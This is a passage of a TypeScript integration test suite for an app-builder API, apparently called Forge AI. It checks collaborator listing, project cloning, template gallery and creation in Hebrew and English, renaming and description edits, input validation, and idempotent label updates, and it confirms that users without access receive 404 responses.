    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; ownerId: string } };

    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      headers: authHeaders(ownerToken),
    });
    const { owner: ownerFromList } = (await listRes.json()) as {
      owner: { userId: string; email: string } | null;
    };
    assert.ok(ownerFromList, "GET /collaborators must return an owner object");
    assert.equal(ownerFromList!.userId, project.ownerId);
    assert.equal(ownerFromList!.email, "owner-collab-info1@example.com");

    const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab-info1@example.com" }),
    });
    const { owner: ownerFromInvite } = (await inviteRes.json()) as {
      owner: { userId: string; email: string } | null;
    };
    assert.ok(ownerFromInvite, "POST /collaborators must also return an owner object");
    assert.equal(ownerFromInvite!.userId, project.ownerId);
    assert.equal(ownerFromInvite!.email, "owner-collab-info1@example.com");
  });
});

test("a collaborator (not the owner) can also see the real owner's id and email via GET /collaborators", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab-info2@example.com");
    const collabToken = await signup(baseUrl, "collab-info2@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; ownerId: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "collab-info2@example.com" }),
    });

    const listAsCollab = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      headers: authHeaders(collabToken),
    });
    assert.equal(listAsCollab.status, 200);
    const { owner } = (await listAsCollab.json()) as { owner: { userId: string; email: string } | null };
    assert.ok(owner, "a collaborator must also be able to see who owns the project");
    assert.equal(owner!.userId, project.ownerId);
    assert.equal(owner!.email, "owner-collab-info2@example.com");
  });
});

test("inviting an email with no Forge AI account returns a clear error instead of silently doing nothing", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab4@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "nobody-signed-up-with-this@example.com" }),
    });
    assert.equal(inviteRes.status, 404);
    const body = (await inviteRes.json()) as { code: string };
    assert.equal(body.code, "COLLABORATOR_USER_NOT_FOUND");
  });
});

test("inviting the project owner's own email is rejected rather than silently accepted", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner-collab5@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "owner-collab5@example.com" }),
    });
    assert.equal(inviteRes.status, 400);
    const body = (await inviteRes.json()) as { code: string };
    assert.equal(body.code, "CANNOT_ADD_OWNER_AS_COLLABORATOR");
  });
});

test("cloning a project creates a brand-new draft owned by the requester, with the same spec but a distinguishing name, and never copies real data", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "clone-owner1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; name: string; status: string } };

    // Build it and insert a real record, specifically to prove the clone
    // never carries that data over -- only the blueprint.
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    await collectSSE(buildRes);
    const builtRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(ownerToken) });
    const { project: builtProject } = (await builtRes.json()) as {
      project: { spec: { entities: { name: string }[] } };
    };
    const firstEntity = builtProject.spec.entities[0].name;
    await fetch(`${baseUrl}/api/projects/${project.id}/entities/${firstEntity}`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ name: "Real customer, not a template" }),
    });

    const cloneRes = await fetch(`${baseUrl}/api/projects/${project.id}/clone`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    assert.equal(cloneRes.status, 201);
    const { project: cloned } = (await cloneRes.json()) as {
      project: { id: string; name: string; ownerId: string; status: string; description: string; spec: unknown };
    };

    assert.notEqual(cloned.id, project.id, "the clone must be a genuinely new project, not the same one");
    assert.equal(cloned.status, "draft", "a clone starts fresh, even though the source was already built");
    assert.match(cloned.name, /copy/i);
    assert.deepEqual(cloned.spec, builtProject.spec, "the clone's blueprint should match the source exactly");

    // The clone has no real database yet (status: draft) -- confirms no
    // data, not just no *visible* data, since there's nothing to query.
    const cloneEntitiesRes = await fetch(`${baseUrl}/api/projects/${cloned.id}/entities/${firstEntity}`, {
      headers: authHeaders(ownerToken),
    });
    assert.equal(cloneEntitiesRes.status, 409, "the clone hasn't been built yet, so its own table doesn't exist");
  });
});

test("a collaborator (not the owner) can also clone a shared project, becoming the owner of their own independent copy", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "clone-owner2@example.com");
    const collabToken = await signup(baseUrl, "clone-collab2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "clone-collab2@example.com" }),
    });

    const cloneRes = await fetch(`${baseUrl}/api/projects/${project.id}/clone`, {
      method: "POST",
      headers: authHeaders(collabToken),
    });
    assert.equal(cloneRes.status, 201);
    const { project: cloned } = (await cloneRes.json()) as { project: { ownerId: string } };

    // Verify by fetching /me instead of trusting a client-suppliable value.
    const meRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(collabToken) });
    const { user: collabUser } = (await meRes.json()) as { user: { id: string } };
    assert.equal(cloned.ownerId, collabUser.id, "the collaborator, not the original owner, should own the clone");
  });
});

test("cloning someone else's project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "clone-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "clone-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const cloneRes = await fetch(`${baseUrl}/api/projects/${project.id}/clone`, {
      method: "POST",
      headers: authHeaders(outsiderToken),
    });
    assert.equal(cloneRes.status, 404);
  });
});

test("GET /templates returns the Templates Gallery's display metadata, but never a template's full spec", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-list1@example.com");
    const res = await fetch(`${baseUrl}/api/templates`, { headers: authHeaders(token) });
    assert.equal(res.status, 200);
    const { templates } = (await res.json()) as {
      templates: { id: string; icon: string; name: string; nameHe: string; description: string; descriptionHe: string; spec?: unknown }[];
    };
    assert.ok(templates.length > 0, "the gallery must offer at least one template");
    const restaurant = templates.find((t) => t.id === "restaurant");
    assert.ok(restaurant, "the restaurant template must be in the gallery");
    assert.ok(restaurant!.nameHe.length > 0);
    assert.ok(restaurant!.name.length > 0);
    assert.equal(restaurant!.spec, undefined, "the list endpoint must not leak each template's full spec");
  });
});

/**
 * Round 711: before this round, the Templates Gallery's own GET /templates
 * route (see its doc comment above) stripped out every entity name, even
 * though TEMPLATES' full spec/specEn were already in memory server-side --
 * a user browsing the gallery had no way to see what a template actually
 * builds beyond whatever happened to be mentioned in its one-line
 * description. Confirms the new entityNames/entityNamesEn fields carry each
 * entity's own display label (Hebrew and English) and nothing more -- no
 * fields, types, required flags, or relations, preserving the route's own
 * "never leak the full spec" intent from the test just above.
 */
test("GET /templates includes each template's entity display labels (Hebrew and English), without leaking field-level spec detail", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-list2@example.com");
    const res = await fetch(`${baseUrl}/api/templates`, { headers: authHeaders(token) });
    assert.equal(res.status, 200);
    const { templates } = (await res.json()) as {
      templates: { id: string; entityNames: string[]; entityNamesEn: string[] }[];
    };
    const restaurant = templates.find((t) => t.id === "restaurant");
    assert.ok(restaurant, "the restaurant template must be in the gallery");
    assert.ok(restaurant!.entityNames.length > 0, "expected at least one Hebrew entity label");
    assert.ok(restaurant!.entityNamesEn.length > 0, "expected at least one English entity label");
    assert.equal(restaurant!.entityNames.length, restaurant!.entityNamesEn.length, "the Hebrew and English entity lists must describe the same entities, just localized");
    assert.ok(restaurant!.entityNames.includes("מנה"), `expected the Hebrew MenuItem label among ${JSON.stringify(restaurant!.entityNames)}`);
    assert.ok(restaurant!.entityNamesEn.includes("Menu Item"), `expected the English MenuItem label among ${JSON.stringify(restaurant!.entityNamesEn)}`);
    // Every entry must be a plain label string, not a nested field/type object.
    for (const label of [...restaurant!.entityNames, ...restaurant!.entityNamesEn]) {
      assert.equal(typeof label, "string");
    }
  });
});

test("POST /projects/from-template creates a buildable draft project from a template, defaulting to its Hebrew display text", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-use1@example.com");
    const res = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm" }),
    });
    assert.equal(res.status, 201);
    const { project } = (await res.json()) as {
      project: { id: string; name: string; description: string; status: string; spec: { entities: { name: string }[] } };
    };
    assert.equal(project.status, "draft");
    assert.equal(project.name, "CRM לניהול לקוחות ועסקאות");
    assert.ok(project.spec.entities.some((e) => e.name === "Deal"), "the CRM template must include a Deal entity");

    // A template-created project is a real, ordinary draft: it must build
    // just like one created from free text, with no special-casing left
    // over from skipping generateSpec.
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    const events = await collectSSE(buildRes);
    assert.ok(events.length > 0, "the build pipeline must actually run for a template-created project");
    const builtRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: built } = (await builtRes.json()) as { project: { status: string } };
    assert.equal(built.status, "built");
  });
});

test("POST /projects/from-template with lang: \"en\" uses the template's English display text instead", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-use2@example.com");
    const res = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm", lang: "en" }),
    });
    assert.equal(res.status, 201);
    const { project } = (await res.json()) as { project: { name: string } };
    assert.equal(project.name, "Sales CRM");
  });
});

/**
 * Regression test for round 492's finding: `lang: "en"` translated the
 * project's own name/description, but `spec` (the actual entities/fields)
 * stayed Hebrew-only -- an English-UI user picking a template got English
 * chrome around Hebrew entity/field labels and enum values. Confirms the
 * created project's spec itself carries English labels, not just its name.
 */
test("POST /projects/from-template with lang: \"en\" also gives the project's own entities/fields English labels, not just its name", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-use-en-spec@example.com");
    const res = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm", lang: "en" }),
    });
    assert.equal(res.status, 201);
    const { project } = (await res.json()) as {
      project: { spec: { entities: { name: string; label?: string; fields: { name: string; label?: string; enumLabels?: Record<string, string> }[] }[] } };
    };
    const deal = project.spec.entities.find((e) => e.name === "Deal");
    assert.ok(deal, "the CRM template must include a Deal entity");
    assert.equal(deal!.label, "Deal", "the Deal entity's own label must be English, not Hebrew, when lang: \"en\" is requested");
    const stageField = deal!.fields.find((f) => f.name === "stage");
    assert.ok(stageField, "the Deal entity must include a stage field");
    assert.equal(stageField!.label, "Stage", "the stage field's own label must be English, not Hebrew");
    assert.equal(stageField!.enumLabels?.won, "Won", "the stage field's enum labels must be English, not Hebrew");
  });
});

test("POST /projects/from-template without lang (defaulting to Hebrew) keeps the project's entities/fields in Hebrew", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-use-he-spec@example.com");
    const res = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm" }),
    });
    assert.equal(res.status, 201);
    const { project } = (await res.json()) as { project: { spec: { entities: { name: string; label?: string }[] } } };
    const deal = project.spec.entities.find((e) => e.name === "Deal");
    assert.equal(deal!.label, "עסקה", "with no lang requested, the project's own entities must default to Hebrew labels, matching its name/description");
  });
});

test("POST /projects/from-template 404s on an unknown templateId", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "templates-use3@example.com");
    const res = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "no-such-template" }),
    });
    assert.equal(res.status, 404);
    const body = (await res.json()) as { code: string };
    assert.equal(body.code, "TEMPLATE_NOT_FOUND");
  });
});

test("the owner can rename a project, and a collaborator can too since they have identical full access", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rename-owner1@example.com");
    const collabToken = await signup(baseUrl, "rename-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rename-collab1@example.com" }),
    });

    const ownerRenameRes = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ name: "My Real Business Name" }),
    });
    assert.equal(ownerRenameRes.status, 200);
    const { project: renamedByOwner } = (await ownerRenameRes.json()) as { project: { name: string } };
    assert.equal(renamedByOwner.name, "My Real Business Name");

    const collabRenameRes = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ name: "Renamed By The Collaborator" }),
    });
    assert.equal(collabRenameRes.status, 200);
    const { project: renamedByCollab } = (await collabRenameRes.json()) as { project: { name: string } };
    assert.equal(renamedByCollab.name, "Renamed By The Collaborator");
  });
});

test("renaming a project rejects an empty or whitespace-only name instead of silently accepting it", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rename-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; name: string } };

    const blankRes = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ name: "   " }),
    });
    assert.equal(blankRes.status, 400);

    // Confirm the rejected request never touched the stored name.
    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(ownerToken) });
    const { project: unchanged } = (await getRes.json()) as { project: { name: string } };
    assert.equal(unchanged.name, project.name);
  });
});

test("renaming a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rename-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "rename-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const renameRes = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ name: "Hijacked Name" }),
    });
    assert.equal(renameRes.status, 404);
  });
});

/**
 * Regression test for a real gap found by round 381's Explore survey: a
 * project's description -- unlike its name -- had no edit route at all,
 * even though it's silently re-sent as AI context on every future /refine
 * and /answers call. Mirrors the rename-project test above exactly, one
 * level down (description instead of name).
 */
test("the owner can edit a project's description, and a collaborator can too since they have identical full access", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "desc-owner1@example.com");
    const collabToken = await signup(baseUrl, "desc-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals, typo: paymints." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "desc-collab1@example.com" }),
    });

    const ownerEditRes = await fetch(`${baseUrl}/api/projects/${project.id}/description`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals, with payments." }),
    });
    assert.equal(ownerEditRes.status, 200);
    const { project: editedByOwner } = (await ownerEditRes.json()) as { project: { description: string } };
    assert.equal(editedByOwner.description, "A CRM with customers and deals, with payments.");

    const collabEditRes = await fetch(`${baseUrl}/api/projects/${project.id}/description`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ description: "Edited by the collaborator instead." }),
    });
    assert.equal(collabEditRes.status, 200);
    const { project: editedByCollab } = (await collabEditRes.json()) as { project: { description: string } };
    assert.equal(editedByCollab.description, "Edited by the collaborator instead.");
  });
});

test("editing a project's description rejects an empty or whitespace-only value instead of silently accepting it", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "desc-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; description: string } };

    const blankRes = await fetch(`${baseUrl}/api/projects/${project.id}/description`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "   " }),
    });
    assert.equal(blankRes.status, 400);

    // Confirm the rejected request never touched the stored description.
    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(ownerToken) });
    const { project: unchanged } = (await getRes.json()) as { project: { description: string } };
    assert.equal(unchanged.description, project.description);
  });
});

/**
 * Round 919's finding: CreateProjectSchema's `description` and
 * EnhanceIdeaSchema's `idea` were the two free-text schemas in this file
 * that never got the `.trim()` every sibling schema already has
 * (RenameProjectSchema, UpdateProjectDescriptionSchema -- confirmed by the
 * test just above for exactly this reason -- RenameEntityLabelSchema,
 * RenameCheckpointSchema, RenameFieldLabelSchema). A whitespace-only value
 * passes `min(1)` unchanged (length 1+), reaches
 * HeuristicSpecProvider.generate's/HeuristicPromptEnhancer.enhance's own
 * "must not be empty" guard, and that bare Error propagates past
 * asyncRoute's catch all the way to errorMiddleware's generic branch --
 * a raw 500, not the clean 400 every other malformed-input case here
 * already gets. Confirmed live against the real server before fixing.
 */
test("creating a project or enhancing an idea with a whitespace-only value is rejected with a clean 400, not a raw 500", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "whitespace-create@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "   " }),
    });
    assert.equal(createRes.status, 400, "a whitespace-only description must be rejected with a clean 400, not a raw 500");

    const enhanceRes = await fetch(`${baseUrl}/api/ideas/enhance`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ idea: "   " }),
    });
    assert.equal(enhanceRes.status, 400, "a whitespace-only idea must be rejected with a clean 400, not a raw 500");
  });
});

/**
 * Round 1292: round 919's own fix just above only covered `description` --
 * CreateProjectSchema's `name` was left with no `.trim().min(1)` guard at
 * all, unlike its own sibling RenameProjectSchema (the test near the top
 * of this file for exactly that route). A caller-supplied "" or "   "
 * passed `??`'s own fallback (name ?? deriveName(description), which only
 * triggers for null/undefined) unchanged, storing a blank project name.
 * Not reachable through today's web client (createProject never sends
 * `name`), but a genuine server-side validation hole for any other caller.
 */
test("creating a project with a blank or whitespace-only custom name is rejected with a clean 400, not stored verbatim", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "whitespace-create-name@example.com");

    const emptyRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals.", name: "" }),
    });
    assert.equal(emptyRes.status, 400, "an empty-string name must be rejected with a clean 400");

    const whitespaceRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals.", name: "   " }),
    });
    assert.equal(whitespaceRes.status, 400, "a whitespace-only name must be rejected with a clean 400");
  });
});

test("editing a project's description on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "desc-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "desc-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const editRes = await fetch(`${baseUrl}/api/projects/${project.id}/description`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ description: "Hijacked description" }),
    });
    assert.equal(editRes.status, 404);
  });
});

test("the owner can rename an entity's display label, and a collaborator can too -- the entity's real name/table is untouched", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "entity-label-owner1@example.com");
    const collabToken = await signup(baseUrl, "entity-label-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "entity-label-collab1@example.com" }),
    });

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(ownerToken) });
    await collectSSE(buildRes);

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ label: "הלקוחות שלי" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: relabeled } = (await ownerRes.json()) as { project: { spec: { entities: { name: string; label?: string }[] } } };
    const renamedEntity = relabeled.spec.entities.find((e) => e.name === entityName)!;
    assert.equal(renamedEntity.label, "הלקוחות שלי");
    assert.equal(renamedEntity.name, entityName, "the entity's real name (and therefore its real data table) must be untouched");

    // The real data table must still work after the label change -- proves
    // this was purely a spec metadata edit, not something that desynced
    // the spec from the live database (a 404/500 here would mean the
    // route somehow broke the entity's real name -> table mapping).
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}`, {
      headers: authHeaders(ownerToken),
    });
    assert.equal(listRes.status, 200);

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ label: "Relabeled by the collaborator" }),
    });
    assert.equal(collabRes.status, 200);
    const { project: relabeledByCollab } = (await collabRes.json()) as { project: { spec: { entities: { name: string; label?: string }[] } } };
    assert.equal(relabeledByCollab.spec.entities.find((e) => e.name === entityName)!.label, "Relabeled by the collaborator");
  });
});

test("renaming an entity's label rejects an empty or whitespace-only value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-label-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "   " }),
    });
    assert.equal(res.status, 400);
  });
});

/**
 * Round 960: same withIdempotency gap, and the same fix, as the roles/
 * assumptions/personas PATCH routes (round 943) -- this route reads
 * project.spec and writes it back with no protection at all. A response
 * lost in transit after the rename already committed meant
 * fetchWithWakeRetry's automatic retry re-applied the SAME, now-stale
 * label a second time -- if a genuinely newer edit to this exact entity's
 * label landed in between, the retry silently reverted it back to the old
 * value, with no error to either side.
 */
test("PATCH .../entities/:entityName/label retried with the same idempotency key after a newer edit landed in between replays the original response, instead of reverting the newer edit back to the stale value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-label-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const headers = { ...authHeaders(token), "x-idempotency-key": "entity-label-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ label: "Stale Label" }),
    });
    assert.equal(firstRes.status, 200);
    const firstBody = await firstRes.json();

    // A genuinely newer edit lands in between -- a different request, no
    // idempotency key, exactly like a second browser tab or a different
    // collaborator would send.
    const newerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Fresher Label" }),
    });
    assert.equal(newerRes.status, 200);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ label: "Stale Label" }),
    });
    assert.equal(retryRes.status, 200);
    assert.deepEqual(await retryRes.json(), firstBody, "a retry with the same idempotency key must replay the original response verbatim, not re-run the mutation");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: current } = (await getRes.json()) as { project: { spec: { entities: { name: string; label?: string }[] } } };
    assert.equal(
      current.spec.entities.find((e) => e.name === entityName)!.label,
      "Fresher Label",
      "the retry must never revert the genuinely newer edit back to the stale label",
    );
  });
});

test("renaming a non-existent entity's label 404s, the same as any other entity route", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-label-owner3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/NoSuchEntity/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Anything" }),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_NOT_FOUND");
  });
});

test("renaming an entity's label on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "entity-label-owner4@example.com");
    const outsiderToken = await signup(baseUrl, "entity-label-outsider4@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/label`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ label: "Hijacked Label" }),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can rename a field's display label, and a collaborator can too -- the field's real name/column is untouched", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "field-label-owner1@example.com");
    const collabToken = await signup(baseUrl, "field-label-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "field-label-collab1@example.com" }),
    });

